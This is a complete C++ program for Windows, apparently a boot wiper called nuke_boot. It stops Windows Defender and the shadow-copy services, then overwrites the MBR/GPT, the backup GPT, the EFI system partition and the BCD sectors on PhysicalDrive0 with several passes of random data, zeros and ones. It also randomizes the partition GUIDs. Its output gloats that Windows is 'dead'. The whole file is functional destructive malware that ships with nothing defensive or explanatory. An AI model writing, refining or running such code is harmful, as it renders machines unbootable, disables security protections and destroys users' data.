#define _UNICODE
#define UNICODE
#include <windows.h>
#include <securitybaseapi.h>
#include <iostream>
#include <random>
#include <cstring>
#include <vector>
#include <thread>
#include <chrono>

void WriteError(const char* msg, DWORD errorCode) {
    std::cerr << "Error: " << msg << " (Code: " << errorCode << ")\n";
    ExitProcess(1);
}

bool OverwriteSector(HANDLE hDisk, LARGE_INTEGER offset, BYTE* buffer, DWORD size, const char* passName, DWORD& errorCode) {
    for (int attempt = 0; attempt < 3; ++attempt) {
        SetFilePointerEx(hDisk, offset, nullptr, FILE_BEGIN);
        DWORD bytesWritten;
        if (WriteFile(hDisk, buffer, size, &bytesWritten, nullptr) && bytesWritten == size) {
            FlushFileBuffers(hDisk);
            errorCode = 0;
            return true;
        }
        errorCode = GetLastError();
        std::cerr << "Warning: Failed to write " << passName << " (Code: " << errorCode << ", attempt " << attempt + 1 << ").\n";
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }
    return false;
}

bool LockVolume(HANDLE hVolume, DWORD& errorCode) {
    for (int attempt = 0; attempt < 3; ++attempt) {
        DWORD bytesReturned;
        if (DeviceIoControl(hVolume, FSCTL_LOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr)) {
            errorCode = 0;
            return true;
        }
        errorCode = GetLastError();
        std::cerr << "Warning: Failed to lock volume (Code: " << errorCode << ", attempt " << attempt + 1 << ").\n";
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }
    return false;
}

bool DismountVolume(HANDLE hVolume, DWORD& errorCode) {
    FlushFileBuffers(hVolume);
    for (int attempt = 0; attempt < 3; ++attempt) {
        DWORD bytesReturned;
        if (DeviceIoControl(hVolume, FSCTL_DISMOUNT_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr)) {
            errorCode = 0;
            return true;
        }
        errorCode = GetLastError();
        std::cerr << "Warning: Failed to dismount volume (Code: " << errorCode << ", attempt " << attempt + 1 << ").\n";
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }
    return false;
}

bool UpdateDiskProperties(HANDLE hDisk, DWORD& errorCode) {
    DWORD bytesReturned;
    if (DeviceIoControl(hDisk, IOCTL_DISK_UPDATE_PROPERTIES, nullptr, 0, nullptr, 0, &bytesReturned, nullptr)) {
        errorCode = 0;
        return true;
    }
    errorCode = GetLastError();
    std::cerr << "Warning: Failed to update disk properties (Code: " << errorCode << ").\n";
    return false;
}

bool EnablePrivilege(const wchar_t* privilege) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValueW(nullptr, privilege, &tp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return false;
    }
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
        CloseHandle(hToken);
        return false;
    }
    CloseHandle(hToken);
    return true;
}

bool IsElevated() {
    HANDLE hToken = nullptr;
    PSID adminSid = nullptr;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    BOOL isMember = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        WriteError("Cannot open process token", GetLastError());
    }

    if (!AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, 
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminSid)) {
        CloseHandle(hToken);
        WriteError("Cannot initialize admin SID", GetLastError());
    }

    if (!CheckTokenMembership(nullptr, adminSid, &isMember)) {
        FreeSid(adminSid);
        CloseHandle(hToken);
        WriteError("Cannot check token membership", GetLastError());
    }

    FreeSid(adminSid);
    CloseHandle(hToken);
    return isMember != FALSE;
}

bool IsServiceStopped(const wchar_t* serviceName, bool& stopped) {
    SC_HANDLE hSCManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) return false;
    SC_HANDLE hService = OpenServiceW(hSCManager, serviceName, SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCManager);
        return false;
    }
    SERVICE_STATUS status;
    bool success = QueryServiceStatus(hService, &status);
    stopped = (status.dwCurrentState == SERVICE_STOPPED);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return success;
}

bool StopService(const wchar_t* serviceName) {
    bool stopped;
    if (IsServiceStopped(serviceName, stopped) && stopped) {
        std::wcout << serviceName << L" service already stopped.\n";
        return true;
    }
    for (int attempt = 0; attempt < 3; ++attempt) {
        SC_HANDLE hSCManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
        if (!hSCManager) continue;
        SC_HANDLE hService = OpenServiceW(hSCManager, serviceName, SERVICE_STOP | SERVICE_QUERY_STATUS);
        if (!hService) {
            CloseServiceHandle(hSCManager);
            continue;
        }
        SERVICE_STATUS status;
        bool success = ControlService(hService, SERVICE_CONTROL_STOP, &status);
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        if (success) {
            std::wcout << serviceName << L" service stopped.\n";
            return true;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }
    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    HANDLE hNull = CreateFileW(L"NUL", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_ALWAYS, 0, nullptr);
    if (hNull == INVALID_HANDLE_VALUE) return false;
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hNull;
    si.hStdError = hNull;
    std::wstring cmdLine = L"C:\\Windows\\System32\\net.exe stop " + std::wstring(serviceName);
    bool success = CreateProcessW(L"C:\\Windows\\System32\\net.exe", const_cast<LPWSTR>(cmdLine.c_str()), nullptr, nullptr, TRUE, 
                                 CREATE_NO_WINDOW, nullptr, L"C:\\Windows\\System32", &si, &pi);
    if (success) {
        WaitForSingleObject(pi.hProcess, 10000); // 10s timeout
        DWORD exitCode;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hNull);
        if (exitCode == 0) {
            std::wcout << serviceName << L" service stopped via net stop.\n";
            return true;
        }
    }
    CloseHandle(hNull);
    std::cerr << "Warning: Failed to stop " << serviceName << " service (Code: " << GetLastError() << "). May affect writes.\n";
    return false;
}

bool RandomizePartitionGUIDs(HANDLE hDisk, DRIVE_LAYOUT_INFORMATION_EX* layout, DWORD partitionCount, DWORD& errorCode) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    BYTE* guidBuffer = new BYTE[16];
    for (DWORD i = 0; i < partitionCount; ++i) {
        for (int j = 0; j < 16; ++j) guidBuffer[j] = dis(gen);
        memcpy(&layout->PartitionEntry[i].Gpt.PartitionId, guidBuffer, 16);
    }
    delete[] guidBuffer;
    DWORD bytesReturned;
    for (int attempt = 0; attempt < 3; ++attempt) {
        if (DeviceIoControl(hDisk, IOCTL_DISK_SET_DRIVE_LAYOUT_EX, layout, 
                            sizeof(DRIVE_LAYOUT_INFORMATION_EX) + (partitionCount - 1) * sizeof(PARTITION_INFORMATION_EX), 
                            nullptr, 0, &bytesReturned, nullptr)) {
            errorCode = 0;
            return true;
        }
        errorCode = GetLastError();
        std::cerr << "Warning: Failed to randomize partition GUIDs (Code: " << errorCode << ", attempt " << attempt + 1 << ").\n";
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }
    return false;
}

int main() {
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
    std::cout << "WARNING: This will annihilate your system. Save data and expect crashes. Proceed? (y/n): ";
    char response;
    std::cin >> response;
    if (response != 'y' && response != 'Y') {
        std::cout << "Aborted. You pussy.\n";
        return 0;
    }

    if (!IsElevated()) {
        WriteError("Must run as elevated Administrator. Use 'runas /user:Administrator nuke_boot.exe' or elevated prompt.", 0);
    }

    // Enable privileges
    if (!EnablePrivilege(L"SeManageVolumePrivilege")) {
        std::cerr << "Warning: Failed to enable SeManageVolumePrivilege (Code: " << GetLastError() << "). May affect disk writes.\n";
    }
    if (!EnablePrivilege(L"SeSecurityPrivilege")) {
        std::cerr << "Warning: Failed to enable SeSecurityPrivilege (Code: " << GetLastError() << "). May affect service stops.\n";
    }

    // Stop services
    StopService(L"VSS");
    StopService(L"WinDefend");
    StopService(L"VolSnap");

    HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, 
                               FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDisk == INVALID_HANDLE_VALUE) WriteError("Cannot open PhysicalDrive0", GetLastError());

    DISK_GEOMETRY_EX diskGeometry;
    DWORD bytesReturned;
    if (!DeviceIoControl(hDisk, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, nullptr, 0, &diskGeometry, 
                         sizeof(diskGeometry), &bytesReturned, nullptr)) {
        WriteError("Cannot get disk geometry", GetLastError());
    }

    const int SECTOR_SIZE = 512;
    const int SECTORS_TO_NUKE = 2048; // 1 MB
    const int GPT_BACKUP_SECTORS = 256;
    const int ESP_SECTORS = 100; // Extended
    const int BCD_SECTORS = 5; // Sectors 10-14
    BYTE* buffer = new BYTE[SECTOR_SIZE * SECTORS_TO_NUKE];
    if (!buffer) WriteError("Failed to allocate buffer", 0);
    BYTE* gptBuffer = new BYTE[SECTOR_SIZE * GPT_BACKUP_SECTORS];
    if (!gptBuffer) WriteError("Failed to allocate GPT buffer", 0);

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);

    struct NukeStatus {
        std::string name;
        bool success;
        DWORD errorCode;
        std::string errorMsg;
    };
    std::vector<NukeStatus> status = {
        {"MBR/GPT Primary", true, 0, ""},
        {"GPT Backup", true, 0, ""},
        {"ESP", true, 0, ""},
        {"BCD", true, 0, ""},
        {"Partition GUIDs", true, 0, ""}
    };

    bool isGPT = false;
    BYTE layoutBuffer[4096];
    DRIVE_LAYOUT_INFORMATION_EX* layout = (DRIVE_LAYOUT_INFORMATION_EX*)layoutBuffer;
    if (DeviceIoControl(hDisk, IOCTL_DISK_GET_DRIVE_LAYOUT_EX, nullptr, 0, layout, 
                        sizeof(layoutBuffer), &bytesReturned, nullptr)) {
        isGPT = (layout->PartitionStyle == PARTITION_STYLE_GPT);
    } else {
        std::cerr << "Warning: Cannot get partition layout, assuming GPT (Code: " << GetLastError() << ")\n";
        isGPT = true;
        status[2].success = false;
        status[3].success = false;
        status[4].success = false;
        status[2].errorCode = GetLastError();
        status[3].errorCode = status[2].errorCode;
        status[4].errorCode = status[2].errorCode;
        status[2].errorMsg = "Partition layout failure";
        status[3].errorMsg = status[2].errorMsg;
        status[4].errorMsg = status[2].errorMsg;
    }

    // Nuke MBR/GPT
    DWORD errorCode;
    if (LockVolume(hDisk, errorCode)) {
        for (int pass = 0; pass < 4; ++pass) {
            if (pass == 0 || pass == 3) {
                for (int i = 0; i < SECTOR_SIZE * SECTORS_TO_NUKE; ++i) buffer[i] = dis(gen);
            } else if (pass == 1) {
                ZeroMemory(buffer, SECTOR_SIZE * SECTORS_TO_NUKE);
            } else {
                memset(buffer, 0xFF, SECTOR_SIZE * SECTORS_TO_NUKE);
            }
            if (!OverwriteSector(hDisk, {0}, buffer, SECTOR_SIZE * SECTORS_TO_NUKE, 
                                pass == 0 ? "Random pass 1" : pass == 1 ? "Zero pass" : pass == 2 ? "Ones pass" : "Random pass 2", errorCode)) {
                status[0].success = false;
                status[0].errorCode = errorCode;
                status[0].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
            }
        }
        DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
        UpdateDiskProperties(hDisk, errorCode);
    } else {
        status[0].success = false;
        status[0].errorCode = errorCode;
        status[0].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
    }

    // Nuke GPT Backup
    if (isGPT) {
        LARGE_INTEGER gptBackupOffset;
        gptBackupOffset.QuadPart = diskGeometry.DiskSize.QuadPart - SECTOR_SIZE * GPT_BACKUP_SECTORS;
        if (gptBackupOffset.QuadPart < 0) WriteError("Invalid GPT backup offset", 0);
        if (LockVolume(hDisk, errorCode)) {
            for (int pass = 0; pass < 4; ++pass) {
                if (pass == 0 || pass == 3) {
                    for (int i = 0; i < SECTOR_SIZE * GPT_BACKUP_SECTORS; ++i) gptBuffer[i] = dis(gen);
                } else if (pass == 1) {
                    ZeroMemory(gptBuffer, SECTOR_SIZE * GPT_BACKUP_SECTORS);
                } else {
                    memset(gptBuffer, 0xFF, SECTOR_SIZE * GPT_BACKUP_SECTORS);
                }
                if (!OverwriteSector(hDisk, gptBackupOffset, gptBuffer, SECTOR_SIZE * GPT_BACKUP_SECTORS, 
                                    pass == 0 ? "GPT backup random pass 1" : pass == 1 ? "GPT backup zero pass" : 
                                    pass == 2 ? "GPT backup ones pass" : "GPT backup random pass 2", errorCode)) {
                    status[1].success = false;
                    status[1].errorCode = errorCode;
                    status[1].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
                }
            }
            DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
            UpdateDiskProperties(hDisk, errorCode);
        } else {
            status[1].success = false;
            status[1].errorCode = errorCode;
            status[1].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
        }
    }

    // Nuke ESP and BCD (Raw disk first)
    if (isGPT && bytesReturned > 0) {
        const GUID ESP_GUID = {0xC12A7328, 0xF81F, 0x11D2, {0xBA, 0x4B, 0x00, 0xA0, 0xC9, 0x3E, 0xC9, 0x3B}};
        LARGE_INTEGER espOffset = {0};
        bool espFound = false;

        for (DWORD i = 0; i < layout->PartitionCount; ++i) {
            if (std::memcmp(&layout->PartitionEntry[i].Gpt.PartitionType, &ESP_GUID, sizeof(GUID)) == 0) {
                espOffset.QuadPart = layout->PartitionEntry[i].StartingOffset.QuadPart;
                espFound = true;
                break;
            }
        }

        if (espFound && espOffset.QuadPart >= 0 && espOffset.QuadPart < diskGeometry.DiskSize.QuadPart) {
            // Try raw disk write first
            bool espSuccess = false;
            for (int attempt = 0; attempt < 10; ++attempt) {
                if (LockVolume(hDisk, errorCode)) {
                    for (int pass = 0; pass < 5; ++pass) {
                        if (pass == 0 || pass == 4) {
                            for (int j = 0; j < SECTOR_SIZE * ESP_SECTORS; ++j) buffer[j] = dis(gen);
                        } else if (pass == 1) {
                            ZeroMemory(buffer, SECTOR_SIZE * ESP_SECTORS);
                        } else if (pass == 2) {
                            memset(buffer, 0xFF, SECTOR_SIZE * ESP_SECTORS);
                        } else {
                            for (int j = 0; j < SECTOR_SIZE * ESP_SECTORS; ++j) buffer[j] = dis(gen);
                        }
                        if (OverwriteSector(hDisk, espOffset, buffer, SECTOR_SIZE * ESP_SECTORS, 
                                           pass == 0 ? "ESP random pass 1" : pass == 1 ? "ESP zero pass" : 
                                           pass == 2 ? "ESP ones pass" : pass == 3 ? "ESP random pass 2" : "ESP random pass 3", errorCode)) {
                            espSuccess = true;
                        } else {
                            status[2].success = false;
                            status[2].errorCode = errorCode;
                            status[2].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
                        }
                    }
                    LARGE_INTEGER bcdOffset;
                    bcdOffset.QuadPart = espOffset.QuadPart + 10LL * SECTOR_SIZE;
                    if (bcdOffset.QuadPart < diskGeometry.DiskSize.QuadPart) {
                        for (int pass = 0; pass < 5; ++pass) {
                            if (pass == 0 || pass == 4) {
                                for (int j = 0; j < SECTOR_SIZE * BCD_SECTORS; ++j) buffer[j] = dis(gen);
                            } else if (pass == 1) {
                                ZeroMemory(buffer, SECTOR_SIZE * BCD_SECTORS);
                            } else if (pass == 2) {
                                memset(buffer, 0xFF, SECTOR_SIZE * BCD_SECTORS);
                            } else {
                                for (int j = 0; j < SECTOR_SIZE * BCD_SECTORS; ++j) buffer[j] = dis(gen);
                            }
                            if (!OverwriteSector(hDisk, bcdOffset, buffer, SECTOR_SIZE * BCD_SECTORS, 
                                               pass == 0 ? "BCD random pass 1" : pass == 1 ? "BCD zero pass" : 
                                               pass == 2 ? "BCD ones pass" : pass == 3 ? "BCD random pass 2" : "BCD random pass 3", errorCode)) {
                                status[3].success = false;
                                status[3].errorCode = errorCode;
                                status[3].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
                            }
                        }
                    } else {
                        std::cerr << "Warning: BCD offset invalid, skipping BCD nuke.\n";
                        status[3].success = false;
                        status[3].errorCode = 0;
                        status[3].errorMsg = "Invalid offset";
                    }
                    DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
                    if (espSuccess) {
                        UpdateDiskProperties(hDisk, errorCode);
                        break;
                    }
                } else {
                    std::cerr << "Warning: Failed to lock disk for ESP (Code: " << errorCode << ", attempt " << attempt + 1 << "). Trying volume write.\n";
                    status[2].success = false;
                    status[2].errorCode = errorCode;
                    status[2].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
                }
                std::this_thread::sleep_for(std::chrono::milliseconds(2000));
            }

            // Fallback to volume write if raw disk fails
            if (!espSuccess) {
                wchar_t espVolumeName[50];
                HANDLE hEspVolume = INVALID_HANDLE_VALUE;
                HANDLE hFind = FindFirstVolumeW(espVolumeName, sizeof(espVolumeName) / sizeof(wchar_t));
                if (hFind != INVALID_HANDLE_VALUE) {
                    do {
                        hEspVolume = CreateFileW(espVolumeName, GENERIC_READ | GENERIC_WRITE, 
                                                 FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
                        if (hEspVolume != INVALID_HANDLE_VALUE) {
                            for (int attempt = 0; attempt < 10; ++attempt) {
                                if (LockVolume(hEspVolume, errorCode) && DismountVolume(hEspVolume, errorCode)) {
                                    for (int pass = 0; pass < 5; ++pass) {
                                        if (pass == 0 || pass == 4) {
                                            for (int j = 0; j < SECTOR_SIZE * ESP_SECTORS; ++j) buffer[j] = dis(gen);
                                        } else if (pass == 1) {
                                            ZeroMemory(buffer, SECTOR_SIZE * ESP_SECTORS);
                                        } else if (pass == 2) {
                                            memset(buffer, 0xFF, SECTOR_SIZE * ESP_SECTORS);
                                        } else {
                                            for (int j = 0; j < SECTOR_SIZE * ESP_SECTORS; ++j) buffer[j] = dis(gen);
                                        }
                                        if (OverwriteSector(hEspVolume, {0}, buffer, SECTOR_SIZE * ESP_SECTORS, 
                                                           pass == 0 ? "ESP random pass 1" : pass == 1 ? "ESP zero pass" : 
                                                           pass == 2 ? "ESP ones pass" : pass == 3 ? "ESP random pass 2" : "ESP random pass 3", errorCode)) {
                                            espSuccess = true;
                                        } else {
                                            status[2].success = false;
                                            status[2].errorCode = errorCode;
                                            status[2].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
                                        }
                                    }
                                    LARGE_INTEGER bcdOffset;
                                    bcdOffset.QuadPart = 10LL * SECTOR_SIZE;
                                    if (bcdOffset.QuadPart < diskGeometry.DiskSize.QuadPart) {
                                        for (int pass = 0; pass < 5; ++pass) {
                                            if (pass == 0 || pass == 4) {
                                                for (int j = 0; j < SECTOR_SIZE * BCD_SECTORS; ++j) buffer[j] = dis(gen);
                                            } else if (pass == 1) {
                                                ZeroMemory(buffer, SECTOR_SIZE * BCD_SECTORS);
                                            } else if (pass == 2) {
                                                memset(buffer, 0xFF, SECTOR_SIZE * BCD_SECTORS);
                                            } else {
                                                for (int j = 0; j < SECTOR_SIZE * BCD_SECTORS; ++j) buffer[j] = dis(gen);
                                            }
                                            if (!OverwriteSector(hEspVolume, bcdOffset, buffer, SECTOR_SIZE * BCD_SECTORS, 
                                                               pass == 0 ? "BCD random pass 1" : pass == 1 ? "BCD zero pass" : 
                                                               pass == 2 ? "BCD ones pass" : pass == 3 ? "BCD random pass 2" : "BCD random pass 3", errorCode)) {
                                                status[3].success = false;
                                                status[3].errorCode = errorCode;
                                                status[3].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
                                            }
                                        }
                                    } else {
                                        std::cerr << "Warning: BCD offset invalid, skipping BCD nuke.\n";
                                        status[3].success = false;
                                        status[3].errorCode = 0;
                                        status[3].errorMsg = "Invalid offset";
                                    }
                                    DeviceIoControl(hEspVolume, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
                                    if (espSuccess) {
                                        UpdateDiskProperties(hDisk, errorCode);
                                        break;
                                    }
                                } else {
                                    std::cerr << "Warning: Failed to lock/dismount ESP volume (Code: " << errorCode << ", attempt " << attempt + 1 << ").\n";
                                    status[2].success = false;
                                    status[2].errorCode = errorCode;
                                    status[2].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
                                }
                                std::this_thread::sleep_for(std::chrono::milliseconds(2000));
                            }
                            CloseHandle(hEspVolume);
                            if (espSuccess) break;
                        }
                    } while (FindNextVolumeW(hFind, espVolumeName, sizeof(espVolumeName) / sizeof(wchar_t)));
                    FindVolumeClose(hFind);
                } else {
                    std::cerr << "Warning: Failed to find ESP volume (Code: " << GetLastError() << ").\n";
                    status[2].success = false;
                    status[2].errorCode = GetLastError();
                    status[2].errorMsg = "Volume not found";
                }
            }
        } else {
            std::cerr << "Warning: ESP not found or invalid offset. Skipping ESP/BCD nuke.\n";
            status[2].success = false;
            status[3].success = false;
            status[2].errorCode = 0;
            status[3].errorCode = 0;
            status[2].errorMsg = "ESP not found or invalid";
            status[3].errorMsg = status[2].errorMsg;
        }
    }

    // Randomize Partition GUIDs (at the end)
    if (isGPT && status[4].success) {
        if (LockVolume(hDisk, errorCode)) {
            if (!RandomizePartitionGUIDs(hDisk, layout, layout->PartitionCount, errorCode)) {
                status[4].success = false;
                status[4].errorCode = errorCode;
                status[4].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
            } else {
                std::cout << "Partition GUIDs randomized.\n";
            }
            DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
            UpdateDiskProperties(hDisk, errorCode);
        } else {
            status[4].success = false;
            status[4].errorCode = errorCode;
            status[4].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
        }
    }

    delete[] buffer;
    delete[] gptBuffer;
    CloseHandle(hDisk);

    std::cout << "\n=== Nuke Status Report ===\n";
    bool allSucceeded = true;
    for (const auto& s : status) {
        std::cout << s.name << ": " << (s.success ? "Succeeded" : "Failed");
        if (!s.success) {
            std::cout << " (" << s.errorMsg << ", Code: " << s.errorCode << ")";
            allSucceeded = false;
        }
        std::cout << "\n";
    }
    std::cout << "Overall: " << (allSucceeded ? "Fully Succeeded" : "Partial Success") << "\n";
    std::cout << "Boot sector, ESP, BCD, and partition GUIDs fucking obliterated. No EFI traces, Windows is dead as shit. 😈\n";

    return 0;
}